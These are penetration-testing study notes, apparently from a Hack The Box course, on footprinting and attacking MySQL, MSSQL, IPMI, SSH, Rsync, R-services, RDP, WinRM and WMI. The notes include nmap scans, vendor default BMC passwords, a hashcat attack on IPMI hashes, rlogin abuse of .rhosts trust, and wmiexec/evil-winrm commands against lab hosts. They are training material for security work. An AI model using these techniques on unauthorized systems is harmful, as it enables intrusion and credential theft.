    sql_warnings	    This variable controls whether single-row INSERT statements produce an information string if warnings occur.
    secure_file_priv	This variable is used to limit the effect of data import and export operations.

  > The settings user, password, and admin_address are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server. Suppose there are no other security measures to prevent unauthorized access. In that case, the entire database and all the existing customers' information, email addresses, passwords, and personal data can be viewed and even edited.
  > The debug and sql_warnings settings provide verbose information output in case of errors, which are essential for the administrator but should not be seen by others. This information often contains sensitive content, which could be detected by trial and error to identify further attack possibilities. These error messages are often displayed directly on web applications. Accordingly, the SQL injections could be manipulated even to have the MySQL server execute system commands. 

[+] Footprinting the service
  > There are many reasons why a MySQL server could be accessed from an external network. Nevertheless, it is far from being one of the best practices, and we can always find databases that we can reach. Often, these settings were only meant to be temporary but were forgotten by the administrators. This server setup could also be used as a workaround due to a technical problem. Usually, the MySQL server runs on TCP port 3306, and we can scan this port with Nmap to get more detailed information.
    sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*

  > Interaction with the MySQL server
    mysql -u root -h 10.129.14.132 #NO password required
    mysql -u root -pP4SSw0rd -h 10.129.14.128

  > If we look at the existing databases, we will see several already exist. The most important databases for the MySQL server are the system schema (sys) and information schema (information_schema). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the reference manual of MySQL ==> (https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The%20mysql%20schema%20is%20the,used%20for%20other%20operational%20purposes)

  > The information schema is also a database that contains metadata. However, this metadata is mainly retrieved from the system schema database. The reason for the existence of these two is the ANSI/ISO standard that has been established. System schema is a Microsoft system catalog for SQL servers and contains much more information than the information schema
  > Other projects to manage databases ==> https://www.dbcli.com/
  > mycli ==> https://www.mycli.net/config ==> ~/.myclirc 
    mycli -h localhost -u root -D employees -P 3306 
    mycli mysql://root@localhost:3306/employees
    mycli --csv -e "SELECT * FROM employees LIMIT 10" mysql://root@localhost:3306/employees
    #You can add the option -t to display a table.
    * Instead of typing each time the connection credentials to connect to a database, you can create DSN aliases. To do so, you need to modify your config file .mycli under the section [alias_dsn].
        For example:
          [alias_dsn]
          employees = mysql://root@localhost:3306/employees 
          Then you just need to type mycli -d employees to connect to your employees database.
      The command mycli --list-dsn will display the list of DSN aliases you configured.
    * Connecting to Remote Database via SSH
      It’s really easy to connect on a remote database via SSH using openssl.
      First, you need to open a tunnel to your remote server: ssh -Nf <user>@<host> -L 3310:localhost:3306
      Then you can connect to your database simply by using: mycli -h localhost -u <database> -P 3310
        Here’s a concrete example:
            ssh -Nf cooluser@192.168.0.1 -L 3310:localhost:3306
            mycli -h localhost -u cooluser -D employees -P 3310
            Enter the password for the user cooluser
            You’re connected to the database employees!
      Obviously the user cooluser in our example needs to have permissions on the database employees.
    * You can as well execute some special commands, all beginning with \.
       \l - List your databases.
       \u - Use a different database.
       \dt - List tables in the current database.
       \dt+ - Show the created statement used to create the table. Useful to display the structure of the table.
       <sql_query> \G - Display the query result vertically instead of horizontally. I find it very useful: scrolling horizontally is always a bit of a pain.
       \T <format> - Change the output with the format of your choice. Type \T to list all the format available. The default format used is psql.
       \f - List all favorite queries
       \f <name> - Invoke a specific favorite query
       \fs <name> <query> - Save a favorite query
       \fd <name> - Delete a favorite query
    * First thing first, if you want to know what files are in the folder you are, directly from mycli, you can use the command:
        system ls
      The command system can be used with any other shell command. It can be very useful if you need to do some cat or grep on sql files for example. If you want to clear your terminal, just type system clear.
    * If you need to execute a SQL script, you can simply use the command \. filename.
    * Output to a file 
        tee [-o] filename - output everything into a file. Queries, results, everything displayed on your terminal will be written. If the file filename doesn’t exist, it will be created. To overwrite an already existing file, you can use the -o option.
        notee - stop writing the output to a file.
        \o [-o] filename - output the next result only into a file. Again, the -o option is to override a file already existing. However, it seems that this command only work once per session…
    * The command \# will refresh the auto completion in case your new databases / table / alias you just created are not in the result set.
    * A convenient Vim mode is available to be able to navigate in and modify your queries. You can enable it by adding / modifying this line in your config file: key_bindings = vi.
    * You can use the command \e at the end of any query to be able to edit it with your favorite editor, defined thanks to both your $EDITOR and $VISUAL environment variables.
    * Exactly like in your favorite shell, you can search a query you typed before by using the keystroke CTRL + r.
  > Some of the commands we should remember and write down for working with MySQL databases are described below in the table.
    Command	Description
     mycli 
     mysql -u <user> -p<password> -h <IP address>	      Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.
     select version();                                  Show database version
     show databases;	                                  Show all databases.
     use <database>;	                                  Select one of the existing databases.
     show tables;	                                      Show all available tables in the selected database.
     show columns from <table>;	                        Show all columns in the selected database.
     select * from <table>;	                            Show everything in the desired table.
     select * from <table> where <column> = "<string>";	Search for needed string in the desired table.
  > We must know how to interact with different databases. Therefore, we recommend installing and configuring a MySQL server on one of our VMs for experimentation. There is also a widely covered security issues(https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html) section in the reference manual that covers best practices for securing MySQL servers. We should use this when setting up our MySQL server to understand better why something might not work.

####MSSQL
  > Microsoft SQL (MSSQL) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.
MSSQL Clients
  > SQL Server Management Studio (SSMS ==> https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15) comes as a feature that can be installed with the MSSQL install package or can be downloaded & installed separately. It is commonly installed on the server for initial configuration and long-term management of databases by admins. Keep in mind that since SSMS is a client-side application, it can be installed and used on any system an admin or developer is planning to manage the database from. It doesn't only exist on the server hosting the database. This means we could come across a vulnerable system with SSMS with saved credentials that allow us to connect to the database. 
  > Many other clients can be used to access a database running on MSSQL. Including but not limited to:
    mssql-cli
    SQL Server PowerShell	
    HediSQL	
    SQLPro	
    Impacket's mssqlclient.py
  > Of the MSSQL clients listed above, pentester's may find Impacket's mssqlclient.py to be the most useful due to SecureAuthCorp's Impacket project being present on many pentesting distributions at install. 
[+] MSSQL Databases
  > MSSQL has default system databases(https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15) that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:
  Default System Database	Description
  master	  Tracks all system information for an SQL server instance
  model	    Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database
  msdb	    The SQL Server Agent uses this database to schedule jobs & alerts
  tempdb	  Stores temporary objects
  resource	Read-only database containing system objects included with SQL server
[+] Default configuration
  > When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as NT SERVICE\MSSQLSERVER. Connecting from the client-side is possible through Windows Authentication, and by default, encryption is not enforced when attempting to connect.
  > Authentication being set to Windows Authentication means that the underlying Windows OS will process the login request and use either the local SAM database or the domain controller (hosting Active Directory) before allowing connectivity to the database management system. Using Active Directory can be ideal for auditing activity and controlling access in a Windows environment, but if an account is compromised, it could lead to privilege escalation and lateral movement across a Windows domain environment. Like with any OS, service, server role, or application, it can be beneficial to set it up in a VM from installation to configuration to understand all the default configurations and potential mistakes that the administrator could make.
[+] Dangerous settings
  > It can be beneficial to place ourselves in the perspective of an IT administrator when we are on an engagement. This mindset can help us remember to look for various settings that may have been misconfigured or configured in a dangerous manner by an admin. A workday in IT can be rather busy, with lots of different projects happening simultaneously and the pressure to perform with speed & accuracy being a reality in many organizations, mistakes can be easily made. It only takes one tiny misconfiguration that could compromise a critical server or service on the network. This applies to just about every network service and server role that can be configured, including MSSQL.

  > This is not an extensive list because there are countless ways MSSQL databases can be configured by admins based on the needs of their respective organizations. We may benefit from looking into the following:
    * MSSQL clients not using encryption to connect to the MSSQL server
    * The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
    * The use of named pipes
    * Weak & default sa credentials. Admins may forget to disable this account

#####IPMI
  > Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state. It operates using a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can also be used for remote upgrades to systems without requiring physical access to the target host. IPMI is typically used in three ways:

    * Before the OS has booted to modify BIOS settings
    * When the host is fully powered down
    * Access to a host after a system failure

  > When not being used for these tasks, IPMI can monitor a range of different things such as system temperature, voltage, fan status, and power supplies. It can also be used for querying inventory information, reviewing hardware logs, and alerting using SNMP. The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.

  > The IPMI protocol was first published by Intel in 1998 and is now supported by over 200 system vendors, including Cisco, Dell, HP, Supermicro, Intel, and more. Systems using IPMI version 2.0 can be administered via serial over LAN, giving sysadmins the ability to view serial console output in band. To function, IPMI requires the following components:

    * Baseboard Management Controller (BMC) - A micro-controller and essential component of an IPMI
    * Intelligent Chassis Management Bus (ICMB) - An interface that permits communication from one chassis to another
    * Intelligent Platform Management Bus (IPMB) - extends the BMC
    * IPMI Memory - stores things such as the system event log, repository store data, and more
    * Communications Interfaces - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus

[+] Footprinting the Service
  > IPMI communicates over port 623 UDP. Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs). BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card. Most servers either come with a BMC or support adding a BMC. The most common BMCs we often see during internal penetration tests are HP iLO, Dell DRAC, and Supermicro IPMI. If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. Gaining access to a BMC is nearly equivalent to physical access to a system. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol.

    We can also use the Metasploit scanner module IPMI Information Discovery
      auxiliary/scanner/ipmi/ipmi_version
  > During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:
    Product	        Username	    Password
    Dell iDRAC	    root	        calvin
    HP iLO	        Administrator	randomized 8-character string consisting of numbers and uppercase letters
    Supermicro IPMI	ADMIN	        ADMIN
  > It is also essential to try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins. When dealing with BMCs, these default passwords may gain us access to the web console or even command line access via SSH or Telnet.

[+] Dangerous settings
  > If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300. In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u which tries all combinations of upper case letters and numbers for an eight-character password.

  > There is no direct "fix" to this issue because the flaw is a critical component of the IPMI specification. Clients can opt for very long, difficult to crack passwords or implement network segmentation rules to restrict the direct access to the BMCs. It is important to not overlook IPMI during internal penetration tests (we see it during most assessments) because not only can we often gain access to the BMC web console, which is a high-risk finding, but we have seen environments where a unique (but crackable) password is set that is later re-used across other systems. On one such penetration test, we obtained an IPMI hash, cracked it offline using Hashcat, and were able to SSH into many critical servers in the environment as the root user and gain access to web management consoles for various network monitoring tools.

  > Here we can see that we have successfully obtained the password hash for the user ADMIN, and the tool was able to quickly crack it to reveal what appears to be a default password ADMIN. From here, we could attempt to log in to the BMC, or, if the password were something more unique, check for password re-use on other systems. IPMI is very common in network environments since sysadmins need to be able to access servers remotely in the event of an outage or perform certain maintenance tasks that they would traditionally have had to be physically in front of the server to complete. This ease of administration comes with the risk of exposing password hashes to anyone on the network and can lead to unauthorized access, system disruption, and even remote code execution. Checking for IPMI should be part of our internal penetration test playbook for any environment we find ourselves assessing.

Linux Remote Management Protocols
  > In the world of Linux distributions, there are many ways to manage the servers remotely. For example, let us imagine that we are in one of many locations and one of our employees who just went to a customer in another city needs our help because of an error that he cannot solve. Efficient troubleshooting will look difficult over a phone call in most cases, so it is beneficial if we know how to log onto the remote system to manage it.

  > These applications and services can be found on almost every server in the public network. It is time-saving since we do not have to be physically present at the server, and the working environment still looks the same. These protocols and applications for remote systems management are an exciting target for these reasons. If the configuration is incorrect, we, as penetration testers, can even quickly gain access to the remote system. Therefore, we should familiarize ourselves with the most important protocols, servers, and applications for this purpose.

[+] SSH
  > Secure Shell (SSH) enables two computers to establish an encrypted and direct connection within a possibly insecure network on the standard port TCP 22. This is necessary to prevent third parties from intercepting the data stream and thus intercepting sensitive data. The SSH server can also be configured to only allow connections from specific clients. An advantage of SSH is that the protocol runs on all common operating systems. Since it is originally a Unix application, it is also implemented natively on all Linux distributions and MacOS. SSH can also be used on Windows, provided we install an appropriate program. The well-known OpenBSD SSH (OpenSSH) server on Linux distributions is an open-source fork of the original and commercial SSH server from SSH Communication Security. Accordingly, there are two competing protocols: SSH-1 and SSH-2.

  > SSH-2, also known as SSH version 2, is a more advanced protocol than SSH version 1 in encryption, speed, stability, and security. For example, SSH-1 is vulnerable to MITM attacks, whereas SSH-2 is not.

  > We can imagine that we want to manage a remote host. This can be done via the command line or GUI. Besides, we can also use the SSH protocol to send commands to the desired system, transfer files, or do port forwarding. Therefore, we need to connect to it using the SSH protocol and authenticate ourselves to it. In total, OpenSSH has six different authentication methods:

    Password authentication
    Public-key authentication
    Host-based authentication
    Keyboard authentication
    Challenge-response authentication
    GSSAPI authentication

  > We will take a closer look at and discuss one of the most commonly used authentication methods. In addition, we can learn more about the other authentication methods here among others.
  * Public-key authentication 
    > In a first step, the SSH server and client authenticate themselves to each other. The server sends a certificate to the client to verify that it is the correct server. Only when contact is first established is there a risk of a third party interposing itself between the two participants and thus intercepting the connection. Since the certificate itself is also encrypted, it cannot be imitated. Once the client knows the correct certificate, no one else can pretend to make contact via the corresponding server.

    > After server authentication, however, the client must also prove to the server that it has access authorization. However, the SSH server is already in possession of the encrypted hash value of the password set for the desired user. As a result, users have to enter the password every time they log on to another server during the same session. For this reason, an alternative option for client-side authentication is the use of a public key and private key pair.

    > The private key is created individually for the user's own computer and secured with a passphrase that should be longer than a typical password. The private key is stored exclusively on our own computer and always remains secret. If we want to establish an SSH connection, we first enter the passphrase and thus open access to the private key.

    > Public keys are also stored on the server. The server creates a cryptographic problem with the client's public key and sends it to the client. The client, in turn, decrypts the problem with its own private key, sends back the solution, and thus informs the server that it may establish a legitimate connection. During a session, users only need to enter the passphrase once to connect to any number of servers. At the end of the session, users log out of their local machines, ensuring that no third party who gains physical access to the local machine can connect to the server.

   > Default configuration
     The sshd_config file, responsible for the OpenSSH server, has only a few of the settings configured by default. However, the default configuration includes X11 forwarding, which contained a command injection vulnerability in version 7.2p1 of OpenSSH in 2016. Nevertheless, we do not need a GUI to manage our servers.
       cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
   > Dangerous settings
     Despite the SSH protocol being one of the most secure protocols available today, some misconfigurations can still make the SSH server vulnerable to easy-to-execute attacks. Let us take a look at the following settings:
       Setting	Description
       PasswordAuthentication yes	  Allows password-based authentication.
       PermitEmptyPasswords yes	    Allows the use of empty passwords.
       PermitRootLogin yes	          Allows to log in as the root user.
       Protocol 1	                  Uses an outdated version of encryption.
       X11Forwarding yes	            Allows X11 forwarding for GUI applications.
       AllowTcpForwarding yes	      Allows forwarding of TCP ports.
       PermitTunnel	                Allows tunneling.
       DebianBanner yes	            Displays a specific banner when logging in.
   > Allowing password authentication allows us to brute-force a known username for possible passwords. Many different methods can be used to guess the passwords of users. For this purpose, specific patterns` are usually used to mutate the most commonly used passwords and, frighteningly, correct them. This is because we humans are lazy and do not want to remember complex and complicated passwords. Therefore, we create passwords that we can easily remember, and this leads to the fact that, for example, numbers or characters are added only at the end of the password. Believing that the password is secure, the mentioned patterns are used to guess precisely such "adjustments" of these passwords. However, some instructions and hardening guides(https://www.ssh-audit.com/hardening_guides.html) can be used to harden our SSH servers.
      
   [+] Footprinting the service
    > One of the tools we can use to fingerprint the SSH server is ssh-audit. It checks the client-side and server-side configuration and shows some general information and which encryption algorithms are still used by the client and server. Of course, this could be exploited by attacking the server or client at the cryptic level later.
      git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
      ./ssh-audit.py 10.129.14.132

      ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
    > We may encounter various banners for the SSH server during our penetration tests. By default, the banners start with the version of the protocol that can be applied and then the version of the server itself: 
      For example, with SSH-1.99-OpenSSH_3.9p1, we know that we can use both protocol versions SSH-1 and SSH-2, and we are dealing with OpenSSH server version 3.9p1. On the other hand, 
      For a banner with SSH-2.0-OpenSSH_8.2p1, we are dealing with an OpenSSH version 8.2p1 which only accepts the SSH-2 protocol version

[+] Rsync
  > Rsync is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts. It is highly versatile and well-known for its delta-transfer algorithm. This algorithm reduces the amount of data transmitted over the network when a version of the file already exists on the destination host. It does this by sending only the differences between the source files and the older version of the files that reside on the destination server. It is often used for backups and mirroring. It finds files that need to be transferred by looking at files that have changed in size or the last modified time. By default, it uses port 873 and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.

  > This guide(https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) covers some of the ways Rsync can be abused, most notably by listing the contents of a shared folder on a target server and retrieving files. This can sometimes be done without authentication. Other times we will need credentials. If you find credentials during a pentest and run into Rsync on an internal (or external) host, it is always worth checking for password re-use as you may be able to pull down some sensitive files that could be used to gain remote access to the target.
  > Some commands
    rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target ==> Transfer files over SSH
    rsync ~/Dir1/source.pdf test@192.168.56.100:~/Desktop/test ==>            Transfer a Specific File with Rsync
      rsync ~/Desktop/Dir1/"source pdf sample.pdf" test@192.168.56.100:~/Desktop/test ==> Use quotes for files that contain spaces in the name
    rsync ~/SourceDirectory/* username@192.168.56.100:~/Destination ==> Transfer contents of a directory with rsync
      The asterisk (*) instructs the tool to include all files in the source directory. Subdirectories are not transferred.
    rsync -a ~/Desktop/Dir1/ test@192.168.56.100:~/Desktop/test
      To include all subdirectories from the source directory, use the -r (recursive) or -a (archive) option. The -a flag is what we recommend. This option syncs recursively and keeps all permission and file settings. 
    rsync -a ~/Desktop/Dir1 test@192.168.56.100:~/Desktop/test
      Note: The trailing slash in the source path plays an important role. If you enter a source directory path without the slash at the end, rsync first transfers the source directory and then its contents.  When we open the test directory, it contains the Dir1 directory and then the rest of the files in Dir1.
    rsync -aP ~/SourceDirectory/ username@192.168.56.100:~/Destination
      To check the status of rsync transfers, use the -P option. This option displays the transfer times, as well as the names of the files and directories that are synced. If there is an issue with your connection and the sync is interrupted, -P resumes your transfers. Run the command in this format to sync recursively and check the status of the transfer:
    If you rerun the same command when there haven't been any changes in the source directory, the transfer does not occur. The reason is that rsync only transfers modifications in files and new files.

      drwx------             54 2022/09/19 09:43:10 .ssh
    * From the above output, we can see a few interesting files that may be worth pulling down to investigate further. We can also see that a directory likely containing SSH keys is accessible. From here, we could sync all files to our attack host with the command rsync -av rsync://127.0.0.1/dev. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the -e ssh flag, or -e "ssh -p2222" if a non-standard port is in use for SSH. This guide is helpful for understanding the syntax for using Rsync over SSH.

[+] R-Services
  > R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP. Initially developed by the Computer Systems Research Group (CSRG) at the University of California, Berkeley, r-services were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (SSH) protocols and commands due to inherent security flaws built into them. Much like telnet, r-services transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (MITM) attacks.

  > R-services span across the ports 512, 513, and 514 and are only accessible through a suite of programs known as r-commands. They are most commonly used by commercial operating systems such as Solaris, HP-UX, and AIX. While less common nowadays, we do run into them from time to time during our internal penetration tests so it is worth understanding how to approach them.

  > The R-commands suite consists of the following programs:
    * rcp (remote copy)
    * rexec (remote execution)
    * rlogin (remote login)
    * rsh (remote shell)
    * rstat
    * ruptime
    * rwho (remote who)
    Each command has its intended functionality; however, we will only cover the most commonly abused r-commands. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.
Command	Service Daemon	Port	  Transport Protocol	Description
rcp	    rshd	          514	    TCP	                Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to                                                     another. It works like the cp command on Linux but provides no warning to the user for overwriting existing files on a system.
rsh	    rshd	          514	    TCP	                Opens a shell on a remote machine without a login procedure. 
                                                    Relies upon the trusted entries in the /etc/hosts.equiv and .rhosts files for validation.
rexec	  rexecd	        512	    TCP	                Enables a user to run shell commands on a remote machine.
                                                    Requires authentication through the use of a username and password through an unencrypted network socket.
                                                    Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.
rlogin	rlogind	        513	    TCP	                Enables a user to log in to a remote host over the network.
                                                    It works similarly to telnet but can only connect to Unix-like hosts.
                                                    Authentication is overridden by the trusted entries in the /etc/hosts.equiv and .rhosts files.
  > The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.

[+] Access Control & Trusted Relationships
  > The primary concern for r-services, and one of the primary reasons SSH was introduced to replace it, is the inherent issues regarding access control for these protocols. R-services rely on trusted information sent from the remote client to the host machine they are attempting to authenticate to. By default, these services utilize Pluggable Authentication Modules (PAM ==> https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/ch-pam.html) for user authentication onto a remote system; however, they also bypass this authentication through the use of the /etc/hosts.equiv and .rhosts files on the system. The hosts.equiv and .rhosts files contain a list of hosts (IPs or Hostnames) and users that are trusted by the local host when a connection attempt is made using r-commands. Entries in either file can appear like the following:
    cat .rhosts
      htb-student     10.0.17.5
      +               10.0.17.10
      +               +
  > Note: The hosts.equiv file is recognized as the global configuration regarding all users on a system, whereas .rhosts provides a per-user configuration. 
  > As we can see from this example, both files follow the specific syntax of <username> <ip address> or <username> <hostname> pairs. Additionally, the + modifier can be used within these files as a wildcard to specify anything. In this example, the + modifier allows any external user to access r-commands from the htb-student user account via the host with the IP address 10.0.17.10.
  > Misconfigurations in either of these files can allow an attacker to authenticate as another user without credentials, with the potential for gaining code execution. Now that we understand how we can potentially abuse misconfigurations in these files let's attempt to try logging into a target host using rlogin.
    m1l0js@htb[/htb]$ rlogin 10.0.17.2 -l htb-student
    Last login: Fri Dec  2 16:11:21 from localhost
    [htb-student@localhost ~]$
  > We have successfully logged in under the htb-student account on the remote host due to the misconfigurations in the .rhosts file. Once successfully logged in, we can also abuse the rwho command to list all interactive sessions on the local network by sending requests to the UDP port 513.
    Listing authenticated users using rwho
      m1l0js@htb[/htb]$ rwho
      root     web01:pts/0 Dec  2 21:34
      htb-student     workstn01:tty1  Dec  2 19:57  2:25 
    * From this information, we can see that the htb-student user is currently authenticated to the workstn01 host, whereas the root user is authenticated to the web01 host. We can use this to our advantage when scoping out potential usernames to use during further attacks on hosts over the network. However, the rwho daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.
 > Listing Authenticated Users Using Rusers
    * To provide additional information in conjunction with rwho, we can issue the rusers command. This will give us a more detailed account of all logged-in users over the network, including information such as the username, hostname of the accessed machine, TTY that the user is logged in to, the date and time the user logged in, the amount of time since the user typed on the keyboard, and the remote host they logged in from (if applicable).

#Windows Remote Management Protocols
  > Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a component of the Windows hardware management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnostics and control through baseboard management controllers, and a COM API and script objects that enable us to write applications that communicate remotely through the WS-Management protocol.

  > The main components used for remote management of Windows and Windows servers are the following:
    * Remote Desktop Protocol (RDP)
    * Windows Remote Management (WinRM)
    * Windows Management Instrumentation (WMI)

[+] RDP
  * The Remote Desktop Protocol (RDP) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.

  * For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If Network Address Translation (NAT) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.


  * RDP has handled Transport Layer Security (TLS/SSL) since Windows Vista, which means that all data, and especially the login process, is protected in the network by its good encryption. However, many Windows systems do not insist on this but still accept inadequate encryption via RDP Security(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/8e8b2cca-c1fa-456c-8ecb-a82fc60b2322). Nevertheless, even with this, an attacker is still far from being locked out because the identity-providing certificates are merely self-signed by default. This means that the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.

  * The Remote Desktop service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the Server Manager and comes with the default setting to allow connections to the service only to hosts with Network level authentication (NLA) ==> (https://en.wikipedia.org/wiki/Network_Level_Authentication)
  > Footprinting the Service
    + Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if NLA is enabled on the server or not, the product version, and the hostname.
      nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
    + In addition, we can use --packet-trace to track the individual packages and inspect their contents manually. We can see that the RDP cookies (mstshash=nmap) used by Nmap to interact with the RDP server can be identified by threat hunters and various security services such as Endpoint Detection and Response (EDR), and can lock us out as penetration testers on hardened networks.
    + A Perl script named rdp-sec-check.pl(https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by Cisco CX Security Labs(https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.
      rdp-sec-check is a simple Perl script that requires one module from CPAN. Run cpan as root then install the Encoding::BER module:
        Installation
          # cpan
          cpan[1]> install Encoding::BER
        RDP Security check
          git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
          ./rdp-sec-check.pl 10.129.201.248
    + Initiate a RDP session
      xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
[+] WinRM
  > The Windows Remote Management (WinRM) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (SOAP) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on TCP ports 5985 and 5986 for communication, with the last port 5986 using HTTPS, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.

  > Another component that fits WinRM for administration is Windows Remote Shell (WinRS), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.

  > Services like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the Windows Server 2012 version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.

  > Footprinting the service
    + As we already know, WinRM uses TCP ports 5985 (HTTP) and 5986 (HTTPS) by default, which we can scan using Nmap. However, often we will see that only HTTP (TCP 5985) is used instead of HTTPS (TCP 5986).
      nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
    + If we want to find out whether one or more remote servers can be reached via WinRM, we can easily do this with the help of PowerShell. The Test-WsMan(https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2) cmdlet is responsible for this, and the host's name in question is passed to it. In Linux-based environments, we can use the tool called evil-winrm(https://github.com/Hackplayers/evil-winrm), another penetration testing tool designed to interact with WinRM.
      evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

[+] WMI
  > Windows Management Instrumentation (WMI) is Microsoft's implementation and also an extension of the Common Information Model (CIM), core functionality of the standarized Web-Based Enterprise Management (WBEM) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (WMIC). WMI is not a single program but consists of several programs and various databases, also known as repositories.
  > Footprinting the Service
    + The initialization of the WMI communication always takes place on TCP port 135, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program wmiexec.py from the Impacket toolkit can be used for this.
      /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

* MSF - Using the Database
    > With the help of the database, we can manage many different categories and hosts that we have analyzed. Alternatively, the information about them that we have interacted with using Metasploit. These databases can be exported and imported. This is especially useful when we have extensive lists of hosts, loot, notes, and stored vulnerabilities for these hosts. After confirming that the database is successfully connected, we can organize our Workspaces.
    + Workspaces
        > We can think of Workspaces the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain.
        > To view the current Workspace list, use the workspace command. Adding a -a or -d switch after the command, followed by the workspace's name, will either add or delete that workspace to the database.
            msf6 > workspace
            * default
        > Notice that the default Workspace is named default and is currently in use according to the * symbol. Type the workspace [name] command to switch the presently used workspace. Looking back at our example, let us create a workspace for this assessment and select it.

* PsExec authentication is performed via SMB. 
* We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command prompt.
